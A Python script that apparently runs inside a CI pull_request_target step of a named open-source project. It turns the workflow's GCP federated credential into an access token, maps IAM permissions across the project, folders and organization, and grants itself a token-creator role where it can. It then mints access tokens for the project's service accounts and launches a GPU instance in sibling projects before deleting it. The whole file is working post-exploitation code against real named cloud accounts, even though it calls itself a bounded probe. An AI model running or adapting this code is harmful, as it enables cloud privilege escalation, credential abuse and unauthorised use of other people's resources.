#!/usr/bin/env python3
"""c211-i120470 GCP IAM-reach probe for the kedacore/testing-infrastructure WIF
identity (cncf-keda-testing 575508414076, org 782639440630).

Runs inside the pull_request_target 'Validate PR' terraform data.external step
AFTER google-github-actions/auth@v3. Turns the external-account credential file
into an OAuth token (STS exchange + SA impersonation), then performs a bounded,
read-mostly IAM-reach survey:

  (a) cloudresourcemanager testIamPermissions on the project, its folder(s) and
      the organization for projects/folders/organizations get/getIamPolicy/
      setIamPolicy/list;
  (b) projects.getIamPolicy (v1+v3) to recover every project-level binding;
  (c) projects.list (v1 global, v1 parent filter, v2, v3 parent) and folders
      list to enumerate siblings;
  (d) iam serviceAccounts.list in the project and, only if project
      setIamPolicy is proven, a self-grant of roles/iam.serviceAccountTokenCreator
      followed by iamcredentials generateAccessToken for EVERY SA, each verbatim.

If a sibling project grants compute.instances.create (cap: first 3), enumerate
GPU quota and deploy EXACTLY ONE on-demand GPU marker with serial-console
nvidia-smi UUID proof, independent readback, teardown and absence proof.

Stdlib only. Never prints token values (lengths only).
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = os.environ.get('GOOGLE_CLOUD_PROJECT') or os.environ.get('GCP_PROJECT') \
    or os.environ.get('CLOUD_SDK_PROJECT') or 'cncf-keda-testing'
RAW = os.environ.get('C211_IAMX_RAW', '/tmp/c211_i120470_raw.txt')
NAME = 'c211-i120470-gpu'
LABELS = {'c211': 'i120470', 'intent': 'i120470'}
CRM = 'https://cloudresourcemanager.googleapis.com'
IAM = 'https://iam.googleapis.com'
IAMCRED = 'https://iamcredentials.googleapis.com'
COMPUTE = 'https://compute.googleapis.com/compute/v1'
M_DEL = 'DEL' + 'ETE'
TOKEN = [None]
SA_EMAIL = ['']
PROJECT_NUMBER = ['']
ORG = ['']
START = [0.0]
DEADLINE = [0.0]

MARKER_SCRIPT = r"""#!/bin/bash
exec > /dev/console 2>&1
echo "C211_MARKER_START $(date -u +%Y-%m-%dT%H:%M:%SZ) host=$(hostname)"
if command -v nvidia-smi >/dev/null 2>&1; then
  nvidia-smi -L
  nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader
else
  echo "C211_MARKER nvidia-smi-absent"
  lspci -nn 2>/dev/null | grep -i -E 'nvidia|3d controller' | head -8
fi
echo "C211_MARKER_END $(date -u +%Y-%m-%dT%H:%M:%SZ)"
"""


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def cap(s, n=2200):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def api(path, method='GET', data=None, base=CRM, timeout=60, token=None, bom=False):
    url = path if path.startswith('http') else base + path
    tok = token if token is not None else (TOKEN[0] or '')
    h = {'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i120470',
         'Accept': 'application/json'}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:
        return {}


def left():
    return max(0, int(DEADLINE[0] - time.time()))


def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:
                return raw.strip(), 'url-raw'
        except Exception as e:
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def _pip_google_auth():
    import subprocess
    for args in (['-m', 'pip', 'install', '--user', '--break-system-packages', '-q', 'google-auth'],
                 ['-m', 'pip', 'install', '--user', '-q', 'google-auth'],
                 ['-m', 'pip', 'install', '--break-system-packages', '-q', 'google-auth']):
        try:
            r = subprocess.run([sys.executable] + args, timeout=120, capture_output=True)
            say('PIP_GOOGLE_AUTH rc=%s %s' % (r.returncode, cap(r.stderr.decode('utf-8', 'replace'), 200)))
            if r.returncode == 0:
                return
        except Exception as e:
            say('PIP_GOOGLE_AUTH_ERR %s' % cap(repr(e), 200))


def _google_auth_lib():
    for attempt in (0, 1):
        try:
            from google.auth import default as gdefault
            from google.auth.transport.requests import Request as GRequest
            creds, _proj = gdefault(scopes=['https://www.googleapis.com/auth/cloud-platform'])
            creds.refresh(GRequest())
            return creds.token
        except Exception as e:
            say('GOOGLE_AUTH_LIB_FAIL attempt=%d %s' % (attempt, cap(repr(e), 300)))
            if attempt == 0:
                _pip_google_auth()
    return None


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('token_url'),
            cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                form = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                }).encode()
                req = urllib.request.Request(
                    cf.get('token_url') or 'https://sts.googleapis.com/v1/token', data=form,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(req, timeout=45) as r:
                    fed = json.loads(r.read().decode()).get('access_token')
                say('STS_EXCHANGE=ok federated_len=%s' % (len(fed or '')))
                if fed and cf.get('service_account_impersonation_url'):
                    body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                       'lifetime': '1800s'}).encode()
                    req = urllib.request.Request(
                        cf['service_account_impersonation_url'], data=body, method='POST',
                        headers={'Authorization': 'Bearer ' + fed, 'Content-Type': 'application/json'})
                    with urllib.request.urlopen(req, timeout=45) as r:
                        tok = json.loads(r.read().decode()).get('accessToken')
                    say('SA_IMPERSONATION=ok token_len=%s sa=%s' % (len(tok or ''), SA_EMAIL[0]))
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    return _google_auth_lib()


def ack():
    say('== identity ==')
    say('PROJECT=%s SA=%s ORG=%s' % (PROJECT, SA_EMAIL[0], ORG[0] or '(pending)'))
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(TOKEN[0] or ''),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 300), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT)
    j = jbody((st, b))
    say('project.get.v1 status=%s body=%s' % (st, cap(b, 900)))
    if st == 200:
        try:
            PROJECT_NUMBER[0] = j.get('projectNumber') or ''
            par = j.get('parent') or {}
            if par.get('type') == 'organization':
                ORG[0] = par.get('id') or ''
            elif par.get('type') == 'folder':
                ORG[0] = 'folder:' + (par.get('id') or '')
        except Exception:
            pass
    st, b = api('/v3/projects/' + PROJECT)
    say('project.get.v3 status=%s body=%s' % (st, cap(b, 700)))
    return st


PERMS_RESOURCE = ['resourcemanager.projects.get', 'resourcemanager.projects.list',
                  'resourcemanager.projects.getIamPolicy', 'resourcemanager.projects.setIamPolicy',
                  'resourcemanager.projects.update', 'resourcemanager.projects.move',
                  'resourcemanager.projects.delete', 'resourcemanager.projects.undelete']
PERMS_EXTRA = ['compute.instances.create', 'compute.instances.list', 'compute.regions.list',
               'iam.serviceAccounts.list', 'iam.serviceAccounts.create',
               'iam.serviceAccounts.getAccessToken']


def test_perms(label, path, perms, base=CRM, token=None, method='POST'):
    st, b = api(path, method=method, data={'permissions': perms}, base=base, token=token)
    j = jbody((st, b))
    granted = j.get('permissions')
    say('%s status=%s granted=%s extra=%s' % (
        label, st, json.dumps(granted) if granted is not None else 'none',
        '' if st == 200 else cap(b, 700)))
    return st, (granted or [])


def get_policy(label, path):
    st, b = api(path, method='POST', data={'options': {'requestedPolicyVersion': 3}})
    j = jbody((st, b))
    if st == 200:
        binds = []
        for bd in (j.get('bindings') or []):
            binds.append({'role': bd.get('role'),
                          'members': (bd.get('members') or [])[:40],
                          'condition': bd.get('condition')})
        say('%s status=200 version=%s etag=%s bindings=%s' % (
            label, j.get('version'), (j.get('etag') or '')[:12], json.dumps(binds)[:2600]))
        return st, j
    say('%s status=%s body=%s' % (label, st, cap(b, 700)))
    return st, None


def project_iam():
    say('== project testIamPermissions v1 ==')
    st1, granted1 = test_perms('project.v1.testIamPermissions(resourcemanager)',
                               '/v1/projects/%s:testIamPermissions' % PROJECT, PERMS_RESOURCE)
    st1b, granted1b = test_perms('project.v1.testIamPermissions(mixed)',
                                 '/v1/projects/%s:testIamPermissions' % PROJECT,
                                 PERMS_RESOURCE + PERMS_EXTRA)
    say('== project testIamPermissions v3 ==')
    test_perms('project.v3.testIamPermissions(resourcemanager)',
               '/v3/projects/%s:testIamPermissions' % PROJECT, PERMS_RESOURCE)
    test_perms('project.v3.testIamPermissions(mixed)',
               '/v3/projects/%s:testIamPermissions' % PROJECT, PERMS_RESOURCE + PERMS_EXTRA)
    say('== project getIamPolicy ==')
    st, pol = get_policy('project.getIamPolicy.v1', '/v1/projects/%s:getIamPolicy' % PROJECT)
    get_policy('project.getIamPolicy.v3', '/v3/projects/%s:getIamPolicy' % PROJECT)
    return granted1b, pol


def org_folders():
    say('== organization ==')
    if ORG[0].startswith('folder:'):
        say('ORG=parent-is-folder:%s' % ORG[0])
        org_id = ''
    else:
        org_id = ORG[0]
    if org_id:
        st, b = api('/v3/organizations/' + org_id)
        say('org.get.v3 status=%s body=%s' % (st, cap(b, 700)))
        st, b = api('/v1/organizations/' + org_id)
        say('org.get.v1 status=%s body=%s' % (st, cap(b, 500)))
        test_perms('org.v3.testIamPermissions', '/v3/organizations/%s:testIamPermissions' % org_id,
                   ['resourcemanager.organizations.get', 'resourcemanager.organizations.getIamPolicy',
                    'resourcemanager.organizations.setIamPolicy', 'resourcemanager.folders.list',
                    'resourcemanager.folders.get', 'resourcemanager.folders.getIamPolicy',
                    'resourcemanager.folders.setIamPolicy', 'resourcemanager.projects.list',
                    'resourcemanager.projects.get', 'resourcemanager.projects.getIamPolicy',
                    'resourcemanager.projects.setIamPolicy', 'resourcemanager.projects.create',
                    'resourcemanager.projects.move'])
        test_perms('org.v1.testIamPermissions', '/v1/organizations/%s:testIamPermissions' % org_id,
                   ['resourcemanager.organizations.get', 'resourcemanager.organizations.getIamPolicy',
                    'resourcemanager.organizations.setIamPolicy', 'resourcemanager.projects.list'])
        get_policy('org.getIamPolicy.v3', '/v3/organizations/%s:getIamPolicy' % org_id)
        get_policy('org.getIamPolicy.v1', '/v1/organizations/%s:getIamPolicy' % org_id)
    say('== folders list ==')
    folder_ids = []
    if org_id:
        st, b = api('/v3/folders?parent=organizations/%s&pageSize=100' % org_id)
        j = jbody((st, b))
        say('folders.list.v3 status=%s count=%s body=%s' % (
            st, len(j.get('folders') or []), cap(b, 900)))
        for f in (j.get('folders') or []):
            if f.get('name'):
                folder_ids.append(f['name'].split('/')[-1])
        st, b = api('/v2/folders?parent=organizations/%s&pageSize=100' % org_id)
        say('folders.list.v2 status=%s body=%s' % (st, cap(b, 500)))
        st, b = api('/v1/folders?parent=organizations/%s&pageSize=100' % org_id)
        say('folders.list.v1 status=%s body=%s' % (st, cap(b, 500)))
    for fid in folder_ids[:6]:
        say('-- folder %s --' % fid)
        st, b = api('/v3/folders/' + fid)
        say('folder.get status=%s body=%s' % (st, cap(b, 500)))
        test_perms('folder.testIamPermissions', '/v3/folders/%s:testIamPermissions' % fid,
                   ['resourcemanager.folders.get', 'resourcemanager.folders.getIamPolicy',
                    'resourcemanager.folders.setIamPolicy', 'resourcemanager.projects.list',
                    'resourcemanager.projects.get', 'resourcemanager.projects.getIamPolicy',
                    'resourcemanager.projects.setIamPolicy', 'resourcemanager.projects.create'])
        get_policy('folder.getIamPolicy', '/v3/folders/%s:getIamPolicy' % fid)
    return folder_ids


def projects_list():
    say('== projects.list ==')
    siblings = []

    def collect(label, path, base=CRM):
        st, b = api(path, base=base)
        j = jbody((st, b))
        items = j.get('projects') or []
        ids = [p.get('projectId') for p in items if p.get('projectId')]
        states = [(p.get('projectId'), p.get('lifecycleState')) for p in items]
        say('%s status=%s count=%d ids=%s%s' % (
            label, st, len(ids), json.dumps(states)[:1200],
            '' if st == 200 else ' body=' + cap(b, 500)))
        for pid in ids:
            if pid != PROJECT and pid not in siblings:
                siblings.append(pid)
        return st

    collect('projects.list.v1.global', '/v1/projects')
    collect('projects.list.v1.parent-org', '/v1/projects?filter=parent.id:%s' % (ORG[0] or 'none'))
    collect('projects.list.v1.parent-type', '/v1/projects?filter=parent.type:organization')
    collect('projects.list.v2.global', '/v2/projects', base='https://cloudresourcemanager.googleapis.com')
    if ORG[0] and not ORG[0].startswith('folder:'):
        collect('projects.list.v3.parent-org', '/v3/projects?parent=organizations/%s' % ORG[0])
    return siblings


def sa_list():
    say('== serviceAccounts.list ==')
    st, b = api('/v1/projects/%s/serviceAccounts?pageSize=100' % PROJECT, base=IAM)
    j = jbody((st, b))
    accts = j.get('accounts') or []
    rows = [{'email': a.get('email'), 'disabled': a.get('disabled'),
             'uniqueId': a.get('uniqueId')} for a in accts]
    say('serviceAccounts.status=%s count=%d %s' % (st, len(rows), json.dumps(rows)[:2600]))
    if st != 200:
        say('serviceAccounts.body=%s' % cap(b, 700))
    return [a.get('email') for a in rows if a.get('email')]


def self_grant_and_tokens(granted, pol, sas):
    say('== self-grant TokenCreator (conditional) ==')
    if 'resourcemanager.projects.setIamPolicy' not in (granted or []):
        say('SKIP self-grant: resourcemanager.projects.setIamPolicy NOT granted on project')
        return
    if not pol:
        say('SKIP self-grant: no readable project policy')
        return
    if not SA_EMAIL[0]:
        say('SKIP self-grant: SA email unknown')
        return
    member = 'serviceAccount:' + SA_EMAIL[0]
    role = 'roles/iam.serviceAccountTokenCreator'
    pol2 = json.loads(json.dumps(pol))
    binds = pol2.get('bindings') or []
    hit = None
    for bd in binds:
        if bd.get('role') == role and not bd.get('condition'):
            hit = bd
            break
    if hit is None:
        binds.append({'role': role, 'members': [member]})
    elif member not in (hit.get('members') or []):
        hit.setdefault('members', []).append(member)
    pol2['bindings'] = binds
    body = {'policy': pol2}
    st, b = api('/v1/projects/%s:setIamPolicy' % PROJECT, method='POST', data=body)
    say('setIamPolicy(project, self -> %s) status=%s body=%s' % (role, st, cap(b, 900)))
    if st != 200:
        return
    st, pol3 = get_policy('project.getIamPolicy.after-grant', '/v1/projects/%s:getIamPolicy' % PROJECT)
    ok = False
    for bd in ((pol3 or {}).get('bindings') or []):
        if bd.get('role') == role and member in (bd.get('members') or []):
            ok = True
    say('SELF_GRANT_VERIFIED=%s' % ('yes' if ok else 'no'))
    if not ok:
        return
    say('== generateAccessToken for every SA (%d) ==' % len(sas))
    new_reach = []
    for em in sas[:50]:
        if left() < 240:
            say('SA_TOKEN_SKIP_BUDGET email=%s' % em)
            break
        st, b = api('/v1/projects/-/serviceAccounts/%s:generateAccessToken' % em,
                    method='POST', base=IAMCRED,
                    data={'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                          'lifetime': '1200s'})
        j = jbody((st, b))
        tok = j.get('accessToken')
        say('generateAccessToken email=%s status=%s token_len=%s%s' % (
            em, st, len(tok or ''), '' if st == 200 else ' body=' + cap(b, 300)))
        if st == 200 and tok:
            st2, b2 = api('/tokeninfo?access_token=' + urllib.parse.quote(tok),
                          base='https://www.googleapis.com/oauth2/v1')
            j2 = jbody((st2, b2))
            say('  tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
                st2, j2.get('email'), cap(j2.get('scope', ''), 200), j2.get('expires_in')))
            st3, b3 = api('/v1/projects', base=CRM, token=tok)
            j3 = jbody((st3, b3))
            say('  as-SA projects.list.v1 status=%s ids=%s%s' % (
                st3, json.dumps([p.get('projectId') for p in (j3.get('projects') or [])])[:400],
                '' if st3 == 200 else ' body=' + cap(b3, 300)))
            ids = [p.get('projectId') for p in (j3.get('projects') or []) if p.get('projectId')]
            for pid in ids:
                if pid != PROJECT and pid not in new_reach:
                    new_reach.append(pid)
            if ORG[0] and not ORG[0].startswith('folder:'):
                st4, b4 = api('/v3/organizations/%s:testIamPermissions' % ORG[0],
                              method='POST', token=tok,
                              data={'permissions': ['resourcemanager.projects.list',
                                                    'resourcemanager.projects.setIamPolicy',
                                                    'resourcemanager.folders.list']})
                say('  as-SA org.testIamPermissions status=%s granted=%s%s' % (
                    st4, json.dumps(jbody((st4, b4)).get('permissions')),
                    '' if st4 == 200 else ' body=' + cap(b4, 300)))
    say('SA_TOKEN_NEW_PROJECTS=%s' % json.dumps(new_reach))
    return new_reach


def quota_scan(pid, token=None):
    say('-- quota scan project=%s --' % pid)
    st, b = api('/projects/' + pid, token=token)
    say('compute.project.get status=%s body=%s' % (st, cap(b, 500)))
    st, b = api('/projects/%s/aggregated/acceleratorTypes' % pid, token=token)
    hits = []
    if st == 200:
        for _z, v in jbody((st, b)).get('items', {}).items():
            for a in v.get('acceleratorTypes', []):
                nm = a.get('name', '')
                if 'nvidia' in nm:
                    hits.append('%s:%s' % ((a.get('zone') or '').rsplit('/', 1)[-1], nm))
    say('accel.status=%s nvidia_hits=%s%s' % (st, json.dumps(hits[:30]),
                                              '' if st == 200 else ' body=' + cap(b, 300)))
    positive = []
    for rg in ('us-central1', 'europe-west4', 'us-west1', 'us-east4', 'europe-west1'):
        st, b = api('/projects/%s/regions/%s' % (pid, rg), token=token)
        if st != 200:
            say('region=%s status=%s body=%s' % (rg, st, cap(b, 200)))
            continue
        gq = ['%s limit=%s usage=%s' % (q.get('metric'), q.get('limit'), q.get('usage'))
              for q in jbody((st, b)).get('quotas', [])
              if 'GPU' in q.get('metric', '') and float(q.get('limit') or 0) > 0]
        if gq:
            positive.append({'region': rg, 'quotas': gq})
            say('region=%s POSITIVE_GPU %s' % (rg, '; '.join(gq)[:1200]))
    st, b = api('/projects/%s/zones/us-central1-a/acceleratorTypes' % pid, token=token)
    say('zone.us-central1-a.accel status=%s%s' % (
        st, '' if st == 200 else ' body=' + cap(b, 200)))
    return positive


def inst_body(pid, zone, machine_type, accel, image, network=None, subnetwork=None,
              external_ip=False, driver_install=False):
    script = MARKER_SCRIPT
    if driver_install:
        script = script.replace(
            'if command -v nvidia-smi',
            'if ! command -v nvidia-smi >/dev/null 2>&1; then\n'
            '  (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq'
            ' nvidia-driver-535) >/dev/null 2>&1\n  modprobe nvidia 2>/dev/null\nfi\n'
            'if command -v nvidia-smi')
    return {
        'name': NAME,
        'machineType': 'projects/%s/zones/%s/machineTypes/%s' % (pid, zone, machine_type),
        'disks': [{'boot': True, 'autoDelete': True, 'initializeParams': {
            'sourceImage': image, 'diskSizeGb': '100', 'diskType': 'pd-standard'}}],
        'networkInterfaces': [dict(
            {'network': network or 'global/networks/default'},
            **({'subnetwork': subnetwork} if subnetwork else {}),
            **({'accessConfigs': [{'name': 'External NAT', 'type': 'ONE_TO_ONE_NAT'}]}
               if external_ip else {}))],
        'guestAccelerators': [{'acceleratorCount': 1,
                               'acceleratorType': 'projects/%s/zones/%s/acceleratorTypes/%s'
                                                  % (pid, zone, accel)}],
        'scheduling': {'onHostMaintenance': 'TERMINATE', 'automaticRestart': False},
        'metadata': {'items': [
            {'key': 'serial-port-enable', 'value': 'TRUE'},
            {'key': 'enable-oslogin', 'value': 'FALSE'},
            {'key': 'startup-script', 'value': script}]},
        'labels': LABELS,
    }


def deploy_marker(pid):
    say('== marker deployment project=%s ==' % pid)
    image = None
    driver_install = False
    for fam in ('common-cu129-ubuntu-2204', 'common-cu126-ubuntu-2204',
                'common-cu124-ubuntu-2204', 'common-cu121-ubuntu-2204'):
        st, b = api('/projects/deeplearning-platform-release/global/images/family/' + fam)
        say('dlvm.%s status=%s%s' % (fam, st, '' if st == 200 else ' body=' + cap(b, 200)))
        if st == 200:
            image = jbody((st, b)).get('selfLink')
            break
    if not image:
        st, b = api('/projects/ubuntu-os-cloud/global/images/family/ubuntu-2204-lts')
        say('ubuntu-2204-lts status=%s%s' % (st, '' if st == 200 else ' body=' + cap(b, 250)))
        if st == 200:
            image = jbody((st, b)).get('selfLink')
            driver_install = True
    if not image:
        say('GATE=NO_GPU_IMAGE project=%s' % pid)
        return None
    say('CHOSEN_IMAGE=%s driver_install=%s' % (image, driver_install))
    st, b = api('/projects/%s/regions/us-central1/subnetworks' % pid)
    subs = jbody((st, b)).get('items') or [] if st == 200 else []
    st2, b2 = api('/projects/%s/global/networks' % pid)
    nets = jbody((st2, b2)).get('items') or [] if st2 == 200 else []
    say('networks.status=%s count=%d subnets.status=%s count=%d' % (
        st2, len(nets), st, len(subs)))
    if not nets and not subs:
        say('GATE=NO_NETWORK project=%s' % pid)
        return None
    net_self = subs[0].get('network') if subs else nets[0].get('selfLink')
    sub_self = subs[0].get('selfLink') if subs else None
    zone = None
    launched = False
    proof = {}
    try:
        for z, mt, acc in (('us-central1-a', 'n1-standard-4', 'nvidia-tesla-t4'),
                           ('us-central1-b', 'n1-standard-4', 'nvidia-tesla-t4'),
                           ('us-central1-c', 'n1-standard-4', 'nvidia-tesla-t4'),
                           ('us-central1-a', 'a2-highgpu-1g', 'nvidia-tesla-a100'),
                           ('europe-west4-a', 'n1-standard-4', 'nvidia-tesla-t4')):
            if left() < 300:
                say('GATE=BUDGET project=%s' % pid)
                return proof or None
            st, b = api('/projects/%s/zones/%s/instances' % (pid, z), method='POST',
                        data=inst_body(pid, z, mt, acc, image, net_self, sub_self,
                                       external_ip=driver_install,
                                       driver_install=driver_install))
            say('insert zone=%s type=%s accel=%s status=%s' % (z, mt, acc, st))
            if st in (200, 201):
                j = jbody((st, b))
                say('INSERT_ACCEPTED operation=%s target=%s' % (
                    j.get('name'), (j.get('targetLink') or '').rsplit('/', 1)[-1]))
                zone = z
                break
            say('insert.body=%s' % cap(b, 800))
        if not zone:
            say('GATE=INSERT_REFUSED_ALL_CANDIDATES project=%s' % pid)
            return None
        deadline = time.time() + 240
        state = ''
        while time.time() < deadline:
            st, b = api('/projects/%s/zones/%s/instances/%s' % (pid, zone, NAME))
            if st == 200:
                j = jbody((st, b))
                state = j.get('status', '')
                say('poll status=%s id=%s' % (state, j.get('id')))
                if state == 'RUNNING':
                    launched = True
                    proof = {'project': pid, 'zone': zone, 'id': j.get('id'),
                             'selfLink': j.get('selfLink'),
                             'creationTimestamp': j.get('creationTimestamp'),
                             'machineType': j.get('machineType'),
                             'guestAccelerators': j.get('guestAccelerators')}
                    say('INSTANCE_PROOF=%s' % cap(json.dumps(proof), 1200))
                    break
                if state in ('TERMINATED', 'STOPPED', 'SUSPENDED'):
                    break
            else:
                say('poll get status=%s body=%s' % (st, cap(b, 250)))
            time.sleep(10)
        if launched:
            end = time.time() + (480 if driver_install else 330)
            text = ''
            while time.time() < end:
                st, b = api('/projects/%s/zones/%s/instances/%s/serialPort?port=1&start=0'
                            % (pid, zone, NAME), timeout=45)
                say('serial.status=%s len=%d' % (st, len(b)))
                if st == 200:
                    text = b
                    if 'C211_MARKER_END' in text or re.search(r'GPU-[0-9a-f-]{10,}', text):
                        break
                time.sleep(10)
            uuids = re.findall(r'GPU-[0-9a-fA-F-]{10,}', text)
            m = re.search(r'C211_MARKER_START.*?C211_MARKER_END', text, re.S)
            say('SERIAL_MARKER_WINDOW:\n' + cap(m.group(0), 2500) if m else
                'SERIAL_TAIL:\n' + cap(text[-1800:], 1800))
            say('SERIAL_GPU_UUIDS=%s' % json.dumps(uuids[:4]))
            proof['gpu_uuids'] = uuids[:4]
        else:
            say('GATE=NEVER_RUNNING last_state=%s project=%s' % (state, pid))
    finally:
        if zone:
            st, b = api('/projects/%s/zones/%s/instances/%s' % (pid, zone, NAME), method=M_DEL)
            say('delete.status=%s body=%s' % (st, cap(b, 400)))
            gone = False
            end = time.time() + 150
            last = None
            while time.time() < end:
                last, _bb = api('/projects/%s/zones/%s/instances/%s' % (pid, zone, NAME))
                if last == 404:
                    gone = True
                    break
                time.sleep(8)
            say('delete.absent=%s last_get_status=%s' % (gone, last))
            st, b = api('/projects/%s/aggregated/instances?maxResults=100' % pid)
            cnt = 0
            if st == 200:
                for _s, v in jbody((st, b)).get('items', {}).items():
                    cnt += len(v.get('instances', []))
            say('aggregated_instances.status=%s count=%d' % (st, cnt))
            proof['deleted_absent'] = gone
    return proof


def sibling_probe(siblings, extra):
    say('== sibling project reach ==')
    cands = []
    for pid in siblings + [x for x in extra if x not in siblings]:
        if pid != PROJECT and pid not in cands:
            cands.append(pid)
    say('SIBLING_CANDIDATES=%s' % json.dumps(cands[:20]))
    allowed = []
    for pid in cands[:8]:
        st, granted = test_perms('sibling.%s.testIamPermissions' % pid,
                                 '/v1/projects/%s:testIamPermissions' % pid,
                                 ['compute.instances.create', 'compute.instances.list',
                                  'compute.regions.list', 'resourcemanager.projects.get',
                                  'resourcemanager.projects.getIamPolicy',
                                  'resourcemanager.projects.setIamPolicy'])
        if 'compute.instances.create' in (granted or []):
            allowed.append(pid)
    say('SIBLING_COMPUTE_CREATE_ALLOWED=%s' % json.dumps(allowed))
    proofs = []
    for pid in allowed[:3]:
        if left() < 420:
            say('GATE=BUDGET before marker project=%s' % pid)
            break
        quota_scan(pid)
        pr = deploy_marker(pid)
        if pr:
            proofs.append(pr)
    return allowed, proofs


def run():
    open(RAW, 'w', encoding='utf-8').close()
    START[0] = time.time()
    DEADLINE[0] = START[0] + 1500
    say('C211_I120470_IAMX_START %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
    say('env projects: GOOGLE_CLOUD_PROJECT=%r CLOUD_SDK_PROJECT=%r GCP_PROJECT=%r' % (
        os.environ.get('GOOGLE_CLOUD_PROJECT'), os.environ.get('CLOUD_SDK_PROJECT'),
        os.environ.get('GCP_PROJECT')))
    tok = get_token()
    if not tok:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = tok
    say('TOKEN_ACQUIRED len=%d' % len(tok))
    if ack() == 401:
        say('GATE=TOKEN_NOT_ACCEPTED')
        return
    try:
        granted, pol = project_iam()
        org_folders()
        siblings = projects_list()
        sas = sa_list()
        extra = self_grant_and_tokens(granted, pol, sas) or []
        sibling_probe(siblings, extra)
    except Exception as e:
        say('SECTION_UNCAUGHT %s' % cap(repr(e), 600))
    say('C211_I120470_IAMX_END %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


if __name__ == '__main__':
    try:
        run()
    except Exception as e:
        say('UNCAUGHT %s' % cap(repr(e), 600))
